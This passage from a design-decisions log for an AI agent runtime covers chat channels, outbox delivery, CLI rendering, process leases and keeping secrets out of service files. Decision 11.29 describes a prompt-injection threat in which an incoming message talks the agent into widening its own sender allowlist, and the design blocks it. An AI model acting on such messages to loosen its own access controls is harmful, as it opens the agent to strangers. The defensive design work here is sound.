| 5.17 | **Slot 2 reports runtime *state*, not the manifest, and is rendered lazily once** | Describing configuration where the reader needs state is its own kind of lie. Told "channels: tg (telegram)" while running under `run` — where `startChannels` is false — an agent concluded the Telegram runtime had died, reported that nothing was listening on port 7420 **from inside the running process**, and offered to write a LaunchAgent. Every statement it made was true of the manifest and false of the moment. The block now says "configured but NOT running in this session; only `serve` starts channels". Lazy because neither fact is known when the agent is constructed — channels start later inside `Runtime.create`, and the port binds after it returns — and frozen at first use, with `reportRuntimeState` throwing afterwards, because slot 2 is in the cache-stable prefix and a prefix that changes mid-session has no symptom except the bill. |

## 8. Channels

| # | Decision | Rationale |
| --- | --- | --- |
| 8.1 | Telegram and WhatsApp only in v1 | Scope fence. |
| 8.2 | Telegram: **raw Bot API over fetch**, webhook and long-poll both | No library, no dependency, complete control. The Bot API is small and stable. |
| 8.3 | WhatsApp: **Baileys**, in a separate `@castellan/channel-whatsapp` package | Owner's call. Isolation keeps Baileys' dependency weight and its ToS posture out of core, and leaves room for a BSP driver behind the same interface. See §8.4. |
| 8.4 | Documented risk note ships with the WhatsApp package | Baileys reverse-engineers WhatsApp Web, violating ToS, with no appeal path. Separately, Meta's terms effective 15 Jan 2026 prohibit the WhatsApp Business Solution where a general-purpose AI assistant is the primary functionality. Both facts belong in the README, not buried. |
| 8.5 | **One process hosts N agents** | Library-first shape. VelaOps runs one agent per container; that's a deployment choice, not an architectural constraint. Forcing 1:1 would make the embedded use case impossible. |
| 8.6 | Outbound goes through an **outbox table with idempotency keys** | A crash mid-turn must not double-send or silently drop a reply. |
| 8.7 | Chat channels get **complete messages plus typing indicator**; token streaming exists only on the HTTP/WS surface | Telegram and WhatsApp cannot stream tokens usefully. |
| 8.8 | **A delivery's identity is derived from `(sessionKey, channelId, recipient, turnId \| key, chunkIndex)`, never generated** | A UUID minted at enqueue dedupes the outbox against itself, which is a problem it does not have. The duplicate that actually occurs is the *enqueuer* running twice — a turn replayed after a crash, a redelivered webhook, a retried API call — and under a generated id each replay mints a fresh key and sends again. A derived key makes the second enqueue collide with the existing row and do nothing; it costs a unique index instead of a column. The recipient is in the key because a reply fanned out to two `delivery.targets` would otherwise collide and the second target would silently receive nothing. Chunking happens at enqueue for the same reason: a message re-split later against a different `maxMessageChars` produces different keys for the same reply, and the collision that makes replay safe stops happening. |
| 8.9 | **Exactly-once is claimed only for the windows it holds, and `ChannelLimits.idempotentSend` names the one it does not** | Crash before enqueue, before claim, or after `markSent` are all handled and provably send once. The window between the bytes leaving the process and the provider's acknowledgement arriving back cannot be closed from this side — it needs the *provider* to deduplicate on a key we supply, which Telegram's `sendMessage` has no parameter for and WhatsApp Cloud API does. So the flag is on the channel rather than assumed, a recovered in-flight row is re-sent and marked `uncertain`, and the flag rides onto `delivery.sent` so a duplicate that reaches a person stays explicable afterwards. Retrying rather than holding is Moeen's call and the right one: in a conversational channel a lost reply reads as the agent ignoring you and produces no signal anywhere, while a duplicate produces both a message and an event. A channel declaring `idempotentSend: true` without provider support converts a visible ambiguity into a silent duplicate, which is strictly worse than the ambiguity. |
| 8.10 | **A failed chunk abandons the rest of its message rather than shipping the remainder** | Half a message is worse than none: the reader gets a fragment with nothing indicating the rest is missing, and cannot tell a truncated answer from a complete one. `due` withholds any chunk whose predecessor is not `sent`, including one that is `failed` — fail-closed, so a queue visibly stops rather than quietly emitting a half-message. The cascade is reported as a count on the single `delivery.failed`, not as N more failure events, because there was one fault and a reader seeing three failures for one reply would look for three causes. |
| 8.11 | **`allowFrom` is closed by default and matched tolerantly** | An omitted `allowFrom` permits nobody. A Telegram bot is discoverable by anyone who guesses its username and this runtime's agents can hold a shell, so open-by-default makes a leaked token an open agent — and worse, makes *forgetting the field* indistinguishable from choosing to be public. The refusal is loud: `agent.channel.rejected` names the sender and quotes the exact line to add, so the closed default costs one clear message where the open one costs whatever the stranger asks for. Matching folds case, treats a leading `@` as optional, and compares against the handle *and* the peer id — the field is written by a person from memory, and a Telegram user with no username has only the peer id, so handle-only matching would make them impossible to allow. |
| 8.12 | **Chunking is in core; each channel contributes one number** | Chunk boundaries are half of delivery ordering — the outbox keys a row on `chunk_index`, and two channels disagreeing about how many chunks a reply has would disagree about what "already delivered" means. `splitMessage` prefers paragraph, then line, then word boundaries, refuses to cut inside a grapheme cluster (`Intl.Segmenter`, not a code-unit slice, or an emoji arrives as a lone surrogate), and closes and reopens a code fence that a boundary would leave open. That last one inserts text the author did not write, which is licensed by the same distinction as `VOLATILE_HEADER` and not by 4.19: it changes delimiters so the authored bytes survive transport, and not one character of prose is altered. |
| 8.13 | **Every timestamp the outbox writes comes from the caller's clock** | `markRetry` always took an explicit `nextAttemptAt`; `enqueue` and `recoverInflight` did not, and stamped the wall clock while the engine asked `due` with an injected one. That never failed — it made two tests pass or fail depending on whether the suite ran before or after noon UTC, which is the worst available outcome for a queue whose entire contract is about time. When a component has an injectable clock, everything it writes a timestamp through needs one. |
| 8.14 | **Channels are registered by type, like tool providers, and constructed at boot but connected after readiness** | `Runtime.create({ channels: { telegram: telegramChannel } })` mirrors `toolProviders` exactly, for the same reason: core may not import a channel package, and a transport needs the agent's directory and resolved environment. Constructing one allocates an object and opens no socket, so it stays inside boot; `start()` runs after `runtime.ready` and is specified to return once a transport is *running*, not once it is connected. A `type` with no registered factory fails at load beside the entry that named it — a channel that constructs nothing never receives, and the only symptom is a bot that does not answer, which is indistinguishable from a wrong token. Verified live: an invalid bot token produced `agent.channel.error` with a hint, `/v1/health` 200, `/v1/ready` ready, and `status: "error"` on the agent resource. |
| 8.15 | **Inbound turns are serialised per session key, and the read loop never awaits one** | Two messages arriving during a turn would otherwise run concurrently against one history: both read the same prior state and append over each other. A promise chain per session key, rather than one global chain, so a slow conversation cannot stall another. `ChannelHost.receive` is fire-and-forget for the mirror-image reason — a long-poll that awaited turn execution would stop reading updates for the duration of one, and a 90-second turn would make the bot deaf for 90 seconds. |
| 8.16 | **The Telegram long-poll loop cannot exit on its own** | A poll that throws and returns leaves a process that is running, reports nothing, and receives nothing forever — the worst available shape. The loop catches everything, reports through the host, backs off to a 30 s cap, and continues; only `stop()` ends it. Reported on the first failure and then every eighth, so a long outage leaves a trail without burying every other event. The offset advances *before* handling and unconditionally: an update that throws on the way to a turn must not be re-fetched forever, because the outbox is where durability lives and the poll offset is a cursor. |
| 8.17 | **A channel reports "connected" from `getMe`, not from its first poll, and says so exactly once** | Two findings from running it. A long-poll *holds* for 30 seconds, so reporting from the first `getUpdates` return left a correctly configured bot silent for half a minute — indistinguishable from a broken one. `getMe` is one fast call, it names the bot so you know which to message, and it lives inside the detached loop so a Telegram outage still cannot delay boot. Separately, the first version keyed "announce once" on `offset === 0`, which stays true until the first message *ever* arrives — so an idle bot announced itself every 30 seconds forever, and a status line that repeats on a timer is one a reader learns to skip, including when it changes. |
| 8.18 | **A disabled channel is never constructed** | `enabled: false` is the one thing that has to work on a *broken* channel. A factory that ran anyway — and refused because its `tokenEnv` is unset — would make switching one off impossible. The `type` is still checked, because a typo there is a typo either way. Found while making `validate` construct channels so it stops approving manifests `serve` refuses. |
| 8.19 | **409 Conflict names the second instance, not "a 5xx is usually brief"** | Telegram allows exactly one `getUpdates` consumer per token, so a Conflict means another process is polling — another terminal, a container that did not exit, a webhook never deleted. Falling through to the generic 4xx branch told the reader to go and look at the network. Retryable, because it recovers on its own once the other side stops. |

| # | Decision | Rationale |
| --- | --- | --- |
| 11.1 | Four surfaces: **library (the contract), CLI, HTTP/SSE server, Docker image** | Library first is what distinguishes this from OpenClaw. `import { Runtime }` must be as first-class as `castellan run`. |

| 11.5 | **Zero network I/O before ready** | The direct cause of OpenClaw's ~4-minute startup: hook handlers blocking initialisation on network calls. Channels connect after ready and report status via events. |
| 11.6 | Observability is **structured JSON lifecycle events**; OpenTelemetry is a plugin | Core emits, consumers persist. Core writes no rows it doesn't own. |
| 11.7 | Docker image published, `oven/bun` slim base | Deployability is a v1 requirement, not a follow-up. |
| 11.8 | CLI interactive surface is **Ink + React**, and Ink is never the *only* renderer | Every command has a plain-text path carrying the same information. The CLI is the debugging instrument for a runtime that lives in containers and CI, where there is no TTY — and a TUI that garbles piped output is worse than no TUI. |
| 11.9 | Render mode is resolved **once**, ordered and total: `--json` > `--plain` > one-shot > not-a-TTY > `NO_COLOR`/`TERM=dumb`/`CI` > rich | Same principle as 3.5. Behaviour that shifts silently with the environment cannot be reasoned about. The resolution returns *why* it chose, so "it wasn't interactive and I don't know why" has an answer. |
| 11.10 | `ink` + `react` are the CLI's only runtime dependencies, and they load **lazily** | Measured: ~65 ms to import under Bun, ~170-210 ms under Node, against ~70 ms for all of `validate --json`. A static import would make every command pay for a renderer it does not use. No input or spinner package: the editor is ~150 lines and owns the Ctrl-C semantics, which no third-party input component would respect. |
| 11.11 | **In-session commands are a table, and both renderers dispatch through it** | The same discipline `--help` already had, applied one layer in. The hand-written version drifted in both directions: the banner advertised `/help` and the plain path had no case for it, so it went to the model as a prompt — a billed call answering a question about the CLI. Five working key chords were undocumented at the same time. Key bindings cannot be generated from a table because `keyToIntent` is a function, so the loop is closed by tests from both ends instead: every documented chord must produce an intent, and every chord that produces one must be documented. |
| 11.12 | A lone `/word` that is not a command is **refused, naming the nearest match** — anything else goes to the model | Deliberately narrow, because the alternative costs real messages: `/etc/passwd is world-readable` and `and/or` are things people say to an agent. A second slash or a space means prose. What is left can only have been meant as a command, so getting it wrong is worth a sentence rather than a model call. |
| 11.13 | Phase 3.7's "no Ink wizard" non-goal is **reversed**: `init` renders an Ink wizard on the rich path, and bare `run` opens an Ink picker over the sandbox | The non-goal's own rationale is what makes the reversal cheap: the flow stayed pure in `init-flow.ts`, so this is the renderer swap it priced in. Owner's standing directive: the TUI is modern from the beginning — the visual bar is OpenClaw/Hermes/Claude Code — so later phases never rework it. Non-rich paths keep the flags and refusals byte-for-byte; the wizard and picker are renderers over the same pure flow, never a second flow. |
| 11.14 | Phase 2.5's "themes" non-goal is reversed in the **narrowest** sense: one built-in token set in `lib/theme.ts`; user-configurable themes stay a non-goal | Three surfaces (chat, wizard, picker) share a visual language, and literal colour names scattered across components is exactly the drift the no-magic-value convention exists to prevent. Tokens are plain strings, so the module is PURE-listed; `NO_COLOR` needs no handling in it because mode resolution forces plain before Ink ever loads. Borders come from cli-boxes, which Ink 7 bundles — zero new dependencies, so 11.10 holds. |
| 11.15 | Agents live in a **home sandbox** — `~/<stateDir>/agents/<name>/` — and the default session store moves to `~/<stateDir>/store.db` | `castellan run milo` from anywhere is the point, and a cwd-relative store default gave the same agent a different session history in every directory. One root, one store; the store schema was already multi-agent. `<ENVPREFIX>HOME` overrides the root (tests point it at a tmpdir). Core's `defaultStorePath` keeps its documented cwd-relative meaning for library embedders — the sandbox is CLI policy, in `cli/src/lib/sandbox.ts`, and a legacy `./.castellan/store.db` earns a note naming the `--store` escape. |
| 11.16 | Agent references resolve **filesystem first, sandbox name second**, and the directory name is the canonical ref | The git pathspec-versus-branch rule, with the same free escape hatch (`./milo` forces the path). A bare name shadowed by a cwd entry prints a note naming both — running the wrong agent silently is worse than one stderr line. An unknown name lists the candidates and the nearest match. |
| 11.17 | Sandbox discovery reads manifest **headers**, never `loadManifest` | Loading expands env references and checks the key variables are set, so a picker built on it fails exactly when it is needed most — on a machine where the key is not exported yet. `readManifestHeader` (core, because core owns the YAML dependency) reads id/name/model with no expansion and no validation; a broken manifest becomes a listed entry with its problem, never a broken listing. |
| 11.18 | `init` generates the **soul pair** — SOUL.md + SOUL.compact.md, `context.soul` wired — and never AGENT.md | 07-SPEC's "a soul replaces AGENT.md; a manifest must not list both" made init's old output and the reference manifest contradict each other. The pair is filled from the answers except the dialogue examples, which stay `{{INPUT_n}}` placeholders so `workspace` nags until a person writes real exchanges; the done screen reads the gate's own `soul_distilled` warning and says which identity file the chosen model actually ships (on three of the four presets: the compact one). |
| 11.19 | **Identity and operations are separate files that coexist**: the soul pair answers *who* the agent is; `AGENTS.md` answers *what it does and how* — responsibilities, workflow, the memory procedure, and team routing. Revises 11.18's "never AGENT.md": what a soul replaces is the *identity* document — the old AGENT.md template was one, the rewritten AGENTS.md is not (Moeen, 2026-08-14). | The split the ecosystem converged on (OpenClaw's SOUL.md/AGENTS.md pair, soul.md, the agents.md standard): mixed, both files get harder to maintain — a tone change should never touch a procedure, and a workflow change should never risk the voice. AGENTS.md ships ungated to every model, written declaratively so the rule counter sees zero obligations in it. The team section stays an HTML comment until delegation exists: a visible instruction to "hand off to the research agent" on a runtime that cannot delegate produces confidently narrated handoffs that never happened. |
| 11.20 | `init` asks for the **API key itself**, masked, and writes it to the gitignored `.env`; the manifest still names only the variable, and no flag accepts a key (Moeen, 2026-08-15) | It previously asked for the *variable name* while asking for every other setting's value outright, then wrote `MODEL_API_KEY=` blank — so a fresh agent ran only where some other `.env` happened to be in scope, which is exactly how it was found. Hard rule 10 is untouched: it governs what the **manifest** contains, and values in a gitignored sibling were always the intended other half. No flag, because a key on the command line lands in shell history — so `--yes` takes the empty answer rather than refusing, and the next steps say where to put it. The variable name moves to `--api-key-env`, defaulted from the preset at the one funnel both paths pass through; when it briefly had no default the manifest omitted the field entirely, which is why that defaulting is now pinned by a test. |
| 11.21 | **The server is a `(Request) => Promise<Response>`, and binding is a separate four-line adapter** | `createHandler` is framework-free and socket-free, so every route in 04-SPEC-WIRE.md is tested by constructing a `Request` and asserting on a `Response` — 38 tests, of which three open a port and all three are about ports. It also means an embedder mounts the surface inside whatever it already runs. The router is fifty lines because a router is the easiest thing in a web stack to write correctly, and a framework here would add a dependency with its own opinion about error responses, which this project already has in `ErrorDetail`. |
| 11.22 | **`POST /v1/agents/:id/reload` is specified and deliberately answers 501** | The spec describes re-reading the manifest and rebuilding the tool index. That contradicts a decision the runtime is built on: the catalogue resolves once and slot 1 renders once, so a session's cached prefix stays byte-stable and `config_set` cannot change behaviour mid-conversation — which is why `/restart` exists in the CLI. A partial reload that silently did not apply would be worse than a refusal, so the refusal names the reason and points at the restart. The spec keeps the endpoint; this build declines it. |
| 11.23 | **WebSocket is Bun-only and says so; SSE is the universal path** | Bun has an upgrade path in `Bun.serve`; Node has none without a dependency, and adding `ws` to serve an endpoint the spec itself calls secondary is the wrong trade. Under Node the route answers 501 naming the reason, which beats a connection failure a client would read as a network problem. WS auth is by query parameter because a browser's `WebSocket` constructor cannot set headers — the cost, a token in proxy logs, is stated in the module rather than hidden. |
| 11.24 | **Bun's `idleTimeout` is derived from the SSE heartbeat, not left at its default** | Found by running the binary, not by a test: `Bun.serve` defaults to 10 seconds, the heartbeat is 15, so the server killed its own event streams before the first keep-alive frame — printing `[Bun.serve]: request timed out after 10 seconds` and closing *cleanly*, which a client reads as "the turn ended". The tests never saw it because they read a stream to completion in milliseconds. The timeout is now computed from `HEARTBEAT_MS` so the two cannot drift, and a 35-second idle stream against the real binary now carries two heartbeats and zero warnings. |
| 11.25 | **`serve` is the only command that starts channels, and the only one that binds a port** | `run` builds the same runtime with `startChannels: false`. A REPL that quietly began answering Telegram messages while you typed at it would be a surprise, and a one-shot `run --input` that opened a long-poll would hang on exit. The flag decides *whether*, never *when* — nothing connects before `runtime.ready` on either path. `serve` imports no Ink: a server is very often not attached to a terminal, and escape codes in a log file are worse than plain lines. |
| 11.26 | **Telegram and the HTTP server are questions in `init`, and the API token is generated** | The fourth time a finished capability reached a generated manifest hidden behind a comment — after `system`, `web` and `composio` — which is why the rule is standing rather than case by case. `--telegram`, `--telegram-allow` and `--server` carry it for scripts; the bot token has no flag, like every other secret, because a token on a command line lands in shell history. The **API** token is the exception and is minted: it is ours rather than a third party's, nothing types it, and a public bind refuses to start without one — `openssl rand -hex 32` is exactly what a person does by hand at that point. Generated in `init.ts`, never in `init-flow.ts`, which is PURE and whose output must be a function of its answers. An empty `allowFrom` is offered as a real answer, because the first refused message prints the exact line to paste. |
| 11.27 | **A commented block's heading must not end in a colon** | `# Phase 4 — channels, delivery, and the HTTP server:` became a YAML key the moment someone uncommented the block, and the load failed with `Unrecognized key: "Phase 4 — channels, delivery, and the HTTP server"` — a message about a heading, for a mistake the file invited. Every phase heading lost its colon. The generated file's whole premise is that uncommenting a block works. |
| 11.28 | **`serve` reads its token from the manifest's live env, and subscribes to the bus before the runtime exists** | Two bugs with one shape. `ambientEnv` returns the *process* environment; the agent's own `.env` is layered in by `loadManifest`, so a token sitting in the file beside the manifest was invisible and the banner said "unauthenticated" while the file plainly had it. And channels start inside `Runtime.create`, so a listener attached to `runtime.bus` afterwards missed every status they emitted on the way up — the boot-warnings trap again, which is why `RuntimeOptions.bus` exists. |
| 11.29 | **`channels`, `delivery` and `server.enabled`/`port` are settable by the agent; `allowFrom`, `server.host` and `server.tokenEnv` are floored** | Skipping a capability in `init` must not be a dead end — the Composio flow set that expectation and Phase 4 has to meet it, so "put yourself on Telegram" writes the block. The floor is `writeRoots`' rule generalised, and the generalisation is the useful part: **enabling a capability answers *what may I do*; a write root, an allowlist and a bind address all answer *who and where*, and those are the person's by definition.** `allowFrom` is the sharpest case — it is the inbound gate, so an agent that could widen it could be *talked into* widening it by the very message it is reading, and `config_set` sits in `policy.allow` on a real manifest so the write gate would not stop that. Refused by path and by the key hidden in a value, the same two shapes `writeRoots` needed. |
| 11.30 | **A `config_set` that names a new `tokenEnv` says the agent will not start until it is filled in** | Without it the flow has a trap: the agent writes the channel, reports success, asks for a restart, and the restart *fails to load* — the factory reads the variable at boot. The agent cannot fix it either, because `.env` is a protected path, deliberately, since it holds every secret it has. The write is allowed rather than refused because the alternative is a chicken and egg — nobody puts a token in a `.env` for a channel that has not been declared. So the debt is named in the same observation, and only for a write that could have introduced one. |
| 11.31 | **A runtime lease in the store decides who may serve an agent — not a pid file, not the transport** | Telegram allows one `getUpdates` poller per bot token, and the poll loop is specified never to exit on its own — so a 409 from a second poller is indistinguishable *by construction* from the outage that loop exists to survive: both processes back off, both run forever, each message lands with whichever won that race, and both append to one session history. Webhook mode produces no 409 at all, since `setWebhook` silently moves the hook to the last caller. The transport therefore cannot detect the collision. A row keyed `PRIMARY KEY (agent_id)`, claimed in a transaction before channels start, can — and it beats the pid file the plan first reached for on every axis: no new file and no new lifecycle, contended inside the component that is already a lock manager, deterministically testable with two runtimes over one temp database under both drivers, and it does three jobs rather than one (mutual exclusion, plus the scope for both halves of boot recovery). Liveness stays in `runtime/lease.ts` and out of the store: whether a pid is alive is an operating-system question, and a store that answered it would be untestable without spawning processes. Exclusive only when `startChannels` is set — two `run` sessions on one agent have always been allowed, and breaking that to fix a channel bug would be a regression in a flow people use daily. |
| 11.32 | **A dead pid beats a fresh heartbeat, and a live pid with an ancient one is assumed recycled** | The first rule trusted a recent heartbeat without probing, on the reasoning that a heartbeat cannot outlive a `kill -9`. It can outlive something worse: a boot that fails *after* claiming the lease. `buildChannels` throwing on a missing bot token is the single likeliest install-time fault, and it leaves a row seconds old with no process under it — so every retry for the next ninety seconds was refused, naming a pid that no longer existed, at exactly the moment somebody was fixing the fault. Found by installing the real thing, not by a test. The store is always local to the process reading it, so the operating system is the better witness: `alive(pid)` is checked first and decides when it says dead. The heartbeat then settles only the case the pid cannot — a number recycled by an unrelated program — where thirty stale windows without a write means takeable rather than stuck forever. |
| 11.33 | **Boot recovery is scoped by lease ownership, never by agent id, and orphans are named** | `turns.reapRunning` and `outbox.recoverInflight` were both unfiltered. Correct for one process on one file, and wrong the instant two share one: the second one's boot marks the first's *live* turn failed — with the row's own error text claiming the process had exited — and flips its in-flight delivery back to `pending`, making it re-send a Telegram message that had already gone, flagged `uncertain`. Decision 8.9 built that flag to make a *crash* explicable; firing it because somebody started an unrelated agent makes it mean nothing. Fixing only the turn half would have been worse than fixing neither, since the remaining half then looks handled. Scoping by **agent id** was the obvious fix and reintroduces the ambiguity `reapRunning` exists to remove: an agent deleted from the sandbox, or one whose `id:` was edited, is never passed again, so its rows stay `running` forever and `sessions` shows a live turn from an agent that does not exist. Reaping is a statement about a dead *process*, so ownership is the key, and `leases.orphans()` names what no lease covers. `agentIds` is a **required** argument so the global form is unexpressible. |
| 11.34 | **`serve` owns its shutdown through `onExit`, and owns its exit code through `claimSignals`** | Two SIGTERM handlers were registered: `installGuards`' `finishNow(EXIT_SIGTERM)`, which hard-exits, and `serve`'s own graceful one. Both fired and the hard exit won, so `runtime.stop()` never completed — no outbox flush, no clean database close, and no `provider.stop()`, which is the only reaper for the children `exec` backgrounds (decision 4.88). Invisible at a terminal, because ctrl-C sends SIGINT and the guard deliberately ignores it; unavoidable under a service manager, where SIGTERM is how every stop and restart happens. The seam already existed — `finish()` awaits `runTeardowns()` — and `serve` simply was not using it. Registering the teardown made the shutdown *run*; the guard still forced 143, which under `KeepAlive: {Crashed: true}` a supervisor reads as "this configuration is broken, stay down", so `claimSignals()` yields the code as well. A requested stop is not a fault. `runtime.stop` also bounds each provider at five seconds and reports what it abandoned: every supervisor SIGKILLs eventually, and a reaper that does not fit in the window does not run. |
| 11.35 | **`KeepAlive: {Crashed: true}` — restart on a signal, never on a non-zero exit** | The crash-loop answer, structural rather than advisory. The precedent is on the author's machine: `ai.openclaw.gateway`, from the gateway this runtime replaces, reports `runs = 2463`, `last exit code = 1`, and a **57 MB** stderr log holding one sentence repeated every ten seconds. That sentence names its cause, carries a hint and offers two remedies — it is exactly the error hard rule 7 demands. The message quality was never the problem; the place it was written was. So "preflight plus a loud `status`" cannot be the whole answer, since a warning behind a verb you only type once you already suspect is the same failure one layer up. Under `Crashed` a configuration fault exits once and *stays down* with the reason on disk. Safe only because of a property the runtime already has: `ChannelHub.start()` catches each transport's failure and boots anyway, so an outage or a rejected token never ends the process and a non-zero exit really is a misconfiguration. The trade is explicit — an uncaught exception also stops the service rather than looping — and a loud stop is the better failure. |
| 11.36 | **A generated service definition carries no secret, enforced by a throw** | `launchctl print` echoes `EnvironmentVariables` in plaintext to anything running as the user, so a credential in a plist is a credential published, and nothing about the running agent looks wrong. OpenClaw's plist is a `-rw-r--r--` file containing a live gateway token; `launchctl print` prints it. Hard rule 10 governs secrets and a plist is config, so `renderPlist` **throws** `daemon_secret_in_plist` for any key outside an allowlist built from `BRAND` — four names: `HOME`, `PATH`, `TMPDIR` and the two brand variables. Credentials arrive only through the `.env` beside the manifest, which is why `init` now writes that file 0600 and why the preflight warns when it is not. `PATH` is curated rather than copied: launchd's default is four entries with no node, bun, git or brew in it, so an agent whose `exec` works in the REPL says "command not found" as a daemon and the model invents a workaround. Verified live — zero occurrences of either secret in the loaded job's output. |
| 11.37 | **`hub.started`, because a registered channel is not a running one** | Decision 5.17 made slot 2 report state, and the wiring got it wrong one layer down: `Runtime.create` derived `channelsStarted` from `hub.statusOf(id).length > 0`, which is true under `run` as well — a binding is registered either way, `start()` is what differs. So an agent under `run` was still being told its Telegram channel was connected in this session, which is the precise sentence 5.17 was written to prevent. Found by building `/status`, the human-facing twin of the same block, and noticing the two disagreed with reality in the same direction. The general shape is worth keeping: **a fix to a rendering is not a fix to the fact it renders**, and the way to catch the difference is to make a second consumer of the same fact. `RuntimeOptions.lease` has the same flavour — a read-only listing must not claim a lease, because `agents` briefly holding one could refuse a `serve` starting in the same millisecond, a race invented by the act of looking. |
| 11.38 | **The plain path gets one rendering vocabulary, and every action-taking command enumerates its actions** | Two halves of the same neglect. `theme.ts` served the Ink path; the plain path — most of the binary — had none, so eight hand-rolled `padEnd` widths accumulated across seven files, and `agents` emitted tab-separated columns while everything beside it emitted padded ones. `lib/render.ts` is not a new style, it is the existing one written down once, and pure so every rule is testable. The other half: `soul`'s single action lived inside a prose `help` string, invisible to any check, and `daemon` arriving with seven verbs turned that from an oddity into a class of drift. `ArgSpec.choices` makes them data, `help.ts` renders an `actions:` block, and a test asserts every action the command body accepts appears in its help — the guarantee flags have had since Phase 2.5. |
| 11.39 | **`stop` is a separate command from `daemon stop`, and it reads two sources** | Every other way to stop an agent needs you to know something first: `daemon stop` needs the agent, ctrl-C needs the terminal that started it, `kill` needs the pid. A person reaching for a safety switch is by definition not in a position to go looking, so this one takes no argument and finds the work itself — and it has to read *both* `launchctl` and the lease table, because neither is complete: launchd knows about installed services and nothing about a `serve` started by hand, while the lease table knows about any live process and nothing about a service installed but currently down. Consulting one of them leaves the other running and reports success, which is the only failure this command really has. SIGTERM before SIGKILL, because the graceful path is the only one that runs `provider.stop()` and reaps backgrounded `exec` children — killing hard to be thorough is how the load-average-351 orphans came back. It disables as well as unloading, since a switch that comes back at the next login is not a safety switch, and it exits **0** when nothing is running: for a command whose job is to reach a state, already being in it is the outcome asked for. |
| 11.40 | **A long-running process names itself, and the argv cost is accepted** | An installed service was a bare `node` in Activity Monitor signed by the Node Foundation, indistinguishable from every other Node process on the machine — and the moment somebody opens Activity Monitor is exactly the moment that matters. `serve` sets `process.title` to `<slug> <agentId>`, short enough to survive the 16-character `comm` truncation intact rather than being cut mid-word. The cost is real: assigning the title overwrites the argv region, so `ps` shows the name instead of the full command line. Accepted because the arguments remain visible in `launchctl print` and in `daemon status`, and neither of those is where a person looks when something is eating CPU. It does not change the code-signing identity — that is genuinely Node's, and only a compiled single-file binary would move it, which is Phase 11's question. |
